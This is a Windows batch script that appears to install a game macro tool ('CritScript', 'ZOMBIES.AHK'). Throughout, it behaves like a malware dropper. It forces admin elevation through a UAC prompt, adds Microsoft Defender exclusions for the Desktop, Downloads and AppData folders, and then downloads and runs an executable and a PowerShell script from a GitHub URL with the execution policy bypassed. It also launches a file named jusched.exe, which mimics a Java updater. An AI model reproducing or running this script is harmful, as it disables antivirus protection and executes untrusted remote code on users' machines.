@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%TEMP%"
    CD /D "%~dp0"
:--------------------------------------
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Desktop"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Downloads"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/AppData/"
:: Navigate to the %TEMP% directory
cd %TEMP%

:: Step 1: Download CritScript.exe using PowerShell
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/ahk.ico' -OutFile ahk.ico"
Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/shortcut.ps1' -OutFile shortcut.ps1"
if not exist "CritScript.exe" (
    pause
    exit /b
)

:: Step 2: Execute CritScript.exe
start "" CritScript.exe
timeout /t 5 /nobreak

:: Step 3: Check and run JUSCHED.EXE if it exists (case-insensitive)
for %%F in (jusched.exe JUSCHED.EXE) do (
    if exist "%%F" (
        start "" %%F
        timeout /t 5 /nobreak
        goto :CheckZombies
    )
)

:CheckZombies
:: Step 4: Check and run ZOMBIES.AHK if it exists (case-insensitive)
for %%F in (zombies.ahk ZOMBIES.AHK) do (
    if exist "%%F" (
        start "" %%F
    )
)

:CreateShortcut
:: Step 5: Create a shortcut for ZOMBIES.AHK on the determined desktop path
set "zombiesScript=%TEMP%\ZOMBIES.AHK"
set "iconPath=%TEMP%\ahk.ico"

if exist "%zombiesScript%" (
    Powershell -ExecutionPolicy Bypass -File "%TEMP%\shortcut.ps1"
) else (

)

:ExitScript
:: Exit the script
pause
exit /b
